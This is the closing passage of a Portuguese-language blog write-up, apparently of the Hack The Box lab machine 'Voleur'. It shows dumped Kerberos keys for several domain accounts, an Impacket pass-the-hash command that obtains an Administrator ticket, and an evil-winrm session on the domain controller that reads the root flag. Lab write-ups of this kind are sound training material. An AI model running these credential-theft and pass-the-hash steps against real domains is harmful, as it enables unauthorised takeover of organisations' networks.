</span></span><span class=line><span class=cl>voleur.htb<span class=se>\*</span>*SVC_LDAP**:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\*</span>*SVC_LDAP**:des-cbc-md5:1ab0fbfeeaef5776
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_backup:des-cbc-md5:7ab513f8ab7f765e
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_iis:des-cbc-md5:70ce25431c577f92
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\j</span>eremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\j</span>eremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\j</span>eremy.combs:des-cbc-md5:192f702abff75257
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
</span></span><span class=line><span class=cl>voleur.htb<span class=se>\s</span>vc_winrm:des-cbc-md5:32b61fb92a7010ab
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Cleaning up... 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&gt; getTGT.py voleur.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2
</span></span><span class=line><span class=cl>Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving ticket in Administrator.ccache
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>&gt; <span class=nb>export</span> <span class=nv>KRB5CCNAME</span><span class=o>=</span>Administrator.ccache     
</span></span><span class=line><span class=cl>&gt; evil-winrm -i <span class=s2>&#34;dc.voleur.htb&#34;</span> -r VOLEUR.HTB
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Evil-WinRM shell v3.7
</span></span><span class=line><span class=cl>                                        
</span></span><span class=line><span class=cl>Info: Establishing connection to remote endpoint
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>ocuments&gt; 
</span></span></code></pre></div><p>E com isso conseguimos a flag root e finalizamos a máquina:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt; cat root.txt
</span></span><span class=line><span class=cl>654471a5001da42030fd1869f97c041d
</span></span></code></pre></div></div><section class="flex flex-row flex-wrap justify-center pt-4 text-xl"><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/&amp;title=Voleur%20-%20HTB" title="Compartilhar pelo LinkedIn" aria-label="Compartilhar pelo LinkedIn"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://twitter.com/intent/tweet/?url=https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/&amp;text=Voleur%20-%20HTB" title="Tweet no Twitter" aria-label="Tweet no Twitter"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
</a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://bsky.app/intent/compose?text=Voleur%20-%20HTB+https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/" title aria-label><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 232.562c-21.183-41.196-78.868-117.97-132.503-155.834-51.378-36.272-70.978-29.987-83.828-24.181-14.872 6.72-17.577 29.554-17.577 42.988.0 13.433 7.365 110.138 12.169 126.281 15.873 53.336 72.376 71.358 124.413 65.574 2.66-.395 5.357-.759 8.089-1.097-2.68.429-5.379.796-8.089 1.097-76.259 11.294-143.984 39.085-55.158 137.972C201.224 526.527 237.424 403.67 256 341.379c18.576 62.291 39.972 180.718 150.734 83.983 83.174-83.983 22.851-126.674-53.408-137.969-2.71-.302-5.409-.667-8.089-1.096 2.732.337 5.429.702 8.089 1.096 52.037 5.785 108.54-12.239 124.413-65.574 4.804-16.142 12.169-112.847 12.169-126.281.0-13.434-2.705-36.267-17.577-42.988-12.85-5.806-32.45-12.09-83.829 24.181C334.868 114.595 277.183 191.366 256 232.562z"/></svg></span>
</a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://s2f.kytta.dev/?text=Voleur%20-%20HTB%20https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/" title aria-label><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M433 179.11c0-97.2-63.71-125.7-63.71-125.7-62.52-28.7-228.56-28.4-290.48.0.0.0-63.72 28.5-63.72 125.7.0 115.7-6.6 259.4 105.63 289.1 40.51 10.7 75.32 13 103.33 11.4 50.81-2.8 79.32-18.1 79.32-18.1l-1.7-36.9s-36.31 11.4-77.12 10.1c-40.41-1.4-83-4.4-89.63-54a102.54 102.54.0 01-.9-13.9c85.63 20.9 158.65 9.1 178.75 6.7 56.12-6.7 105-41.3 111.23-72.9 9.8-49.8 9-121.5 9-121.5zm-75.12 125.2h-46.63v-114.2c0-49.7-64-51.6-64 6.9v62.5h-46.33V197c0-58.5-64-56.6-64-6.9v114.2H90.19c0-122.1-5.2-147.9 18.41-175 25.9-28.9 79.82-30.8 103.83 6.1l11.6 19.5 11.6-19.5c24.11-37.1 78.12-34.8 103.83-6.1 23.71 27.3 18.4 53 18.4 175z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://reddit.com/submit/?url=https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/&amp;resubmit=true&amp;title=Voleur%20-%20HTB" title="Postar no Reddit" aria-label="Postar no Reddit"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8.0-24.9-11.1-24.9-24.6.0-13.8 11.1-24.9 24.9-24.9 13.6.0 24.6 11.1 24.6 24.9.0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4.0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8.0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7.0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9.0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5.0 52.6 59.2 95.2 132 95.2 73.1.0 132.3-42.6 132.3-95.2.0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6.0-2.2-2.2-6.1-2.2-8.3.0-2.5 2.5-2.5 6.4.0 8.6 22.8 22.8 87.3 22.8 110.2.0 2.5-2.2 2.5-6.1.0-8.6-2.2-2.2-6.1-2.2-8.3.0zm7.7-75c-13.6.0-24.6 11.1-24.6 24.9.0 13.6 11.1 24.6 24.6 24.6 13.8.0 24.9-11.1 24.9-24.6.0-13.8-11-24.9-24.9-24.9z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://pinterest.com/pin/create/bookmarklet/?url=https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/&amp;description=Voleur%20-%20HTB" title="Pin no Pinterest" aria-label="Pin no Pinterest"><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6.0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8.0 128.7-68.8 128.7-154.3.0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1.0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6.0-54.7 41.4-107.6 112-107.6 60.9.0 103.6 41.5 103.6 100.9.0 67.1-33.9 113.6-78 113.6-24.3.0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6.0-19-10.2-34.9-31.4-34.9-24.9.0-44.9 25.7-44.9 60.2.0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9.0 361.1.0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://www.facebook.com/sharer/sharer.php?u=https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/&amp;quote=Voleur%20-%20HTB" title="Compartilhar pelo Facebook" aria-label="Compartilhar pelo Facebook"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14.0 55.52 4.84 55.52 4.84v61h-31.28c-30.8.0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="mailto:?body=https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/&amp;subject=Voleur%20-%20HTB" title="Enviar por email" aria-label="Enviar por email"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1-27.64 140.9 68.65 266.2 199.1 285.1 19.01 2.888 36.17-12.26 36.17-31.49l1e-4-.6631c0-15.74-11.44-28.88-26.84-31.24-84.35-12.98-149.2-86.13-149.2-174.2.0-102.9 88.61-185.5 193.4-175.4 91.54 8.869 158.6 91.25 158.6 183.2v16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98.0036c-7.299.0-13.2 4.992-15.12 11.68-24.85-12.15-54.24-16.38-86.06-5.106-38.75 13.73-68.12 48.91-73.72 89.64-9.483 69.01 43.81 128 110.9 128 26.44.0 50.43-9.544 69.59-24.88 24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3c0-149.2-133.9-265.632-287.3-235.57zM239.1 304.3c-26.47.0-48-21.56-48-48.05s21.53-48.05 48-48.05 48 21.56 48 48.05-20.6 48.05-48 48.05z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://api.whatsapp.com/send?text=https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/&amp;resubmit=true&amp;title=Voleur%20-%20HTB" title aria-label><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4.0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3.0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2.0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2.0-101.7 82.8-184.5 184.6-184.5 49.3.0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5.0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8s-14.3 18-17.6 21.8c-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2s-9.7 1.4-14.8 6.9c-5.1 5.6-19.4 19-19.4 46.3.0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://t.me/share/url?url=https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/&amp;resubmit=true&amp;title=Voleur%20-%20HTB" title aria-label><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M248 8C111.033 8 0 119.033.0 256S111.033 504 248 504 496 392.967 496 256 384.967 8 248 8zM362.952 176.66c-3.732 39.215-19.881 134.378-28.1 178.3-3.476 18.584-10.322 24.816-16.948 25.425-14.4 1.326-25.338-9.517-39.287-18.661-21.827-14.308-34.158-23.215-55.346-37.177-24.485-16.135-8.612-25 5.342-39.5 3.652-3.793 67.107-61.51 68.335-66.746.153-.655.3-3.1-1.154-4.384s-3.59-.849-5.135-.5q-3.283.746-104.608 69.142-14.845 10.194-26.894 9.934c-8.855-.191-25.888-5.006-38.551-9.123-15.531-5.048-27.875-7.717-26.8-16.291q.84-6.7 18.45-13.7 108.446-47.248 144.628-62.3c68.872-28.647 83.183-33.623 92.511-33.789 2.052-.034 6.639.474 9.61 2.885a10.452 10.452.0 013.53 6.716A43.765 43.765.0 01362.952 176.66z"/></svg>
</span></a><a target=_blank class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800" href="https://line.me/R/share?text=https://richard-natan.github.io/CatOverflow/writeups/voleur-htb/%20Voleur%20-%20HTB" title="Compartilhar pelo LINE" aria-label="Compartilhar pelo LINE"><span class="relative block icon"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M311 196.8v81.3c0 2.1-1.6 3.7-3.7 3.7h-13c-1.3.0-2.4-.7-3-1.5L254 230v48.2c0 2.1-1.6 3.7-3.7 3.7h-13c-2.1.0-3.7-1.6-3.7-3.7V196.9c0-2.1 1.6-3.7 3.7-3.7h12.9c1.1.0 2.4.6 3 1.6l37.3 50.3V196.9c0-2.1 1.6-3.7 3.7-3.7h13c2.1-.1 3.8 1.6 3.8 3.5zm-93.7-3.7h-13c-2.1.0-3.7 1.6-3.7 3.7v81.3c0 2.1 1.6 3.7 3.7 3.7h13c2.1.0 3.7-1.6 3.7-3.7V196.8c0-1.9-1.6-3.7-3.7-3.7zm-31.4 68.1H150.3V196.8c0-2.1-1.6-3.7-3.7-3.7h-13c-2.1.0-3.7 1.6-3.7 3.7v81.3c0 1 .3 1.8 1 2.5.7.6 1.5 1 2.5 1h52.2c2.1.0 3.7-1.6 3.7-3.7v-13c0-1.9-1.6-3.7-3.5-3.7zm193.7-68.1H327.3c-1.9.0-3.7 1.6-3.7 3.7v81.3c0 1.9 1.6 3.7 3.7 3.7h52.2c2.1.0 3.7-1.6 3.7-3.7V265c0-2.1-1.6-3.7-3.7-3.7H344V247.7h35.5c2.1.0 3.7-1.6 3.7-3.7V230.9c0-2.1-1.6-3.7-3.7-3.7H344V213.5h35.5c2.1.0 3.7-1.6 3.7-3.7v-13c-.1-1.9-1.7-3.7-3.7-3.7zM512 93.4v326c-.1 51.2-42.1 92.7-93.4 92.6H92.6C41.4 511.9-.1 469.8.0 418.6V92.6C.1 41.4 42.2-.1 93.4.0h326c51.2.1 92.7 42.1 92.6 93.4zM441.6 233.5c0-83.4-83.7-151.3-186.4-151.3S68.8 150.1 68.8 233.5c0 74.7 66.3 137.4 155.9 149.3 21.8 4.7 19.3 12.7 14.4 42.1-.8 4.7-3.8 18.4 16.1 10.1s107.3-63.2 146.5-108.2c27-29.7 39.9-59.8 39.9-93.1z"/></svg></span></a></section></div><script type=text/javascript src=/CatOverflow/js/page.min.54b6f4371722649edbe871e431d8670d670878c22be8f36e229fe53cc9b786fe25a834def5e6de621f7a3e37b72bc8cd73839aa5ed907ed6cbd45cd3e1b0fa20.js integrity="sha512-VLb0NxciZJ7b6HHkMdhnDWcIeMIr6PNuIp/lPMm3hv4lqDTe9ebeYh96Pje3K8jNc4Oape2QftbL1FzT4bD6IA==" data-oid=views_writeups/voleur-htb/index.md data-oid-likes=likes_writeups/voleur-htb/index.md></script></section><footer class="pt-8 max-w-prose print:hidden"></footer></article><div id=scroll-to-top class="fixed bottom-24 end-6 z-50 transform translate-y-4 opacity-0 duration-200"><a href=#the-top class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Ir para o topo" title="Ir para o topo">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">&copy;
2025
Richard Silva</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Movido por <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script><script type=text/javascript src=/CatOverflow/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh+sCQ0E53ghYrxgYqw+0GCRyIEpA=="></script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://richard-natan.github.io/CatOverflow/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Pesquisar tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Fechar (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>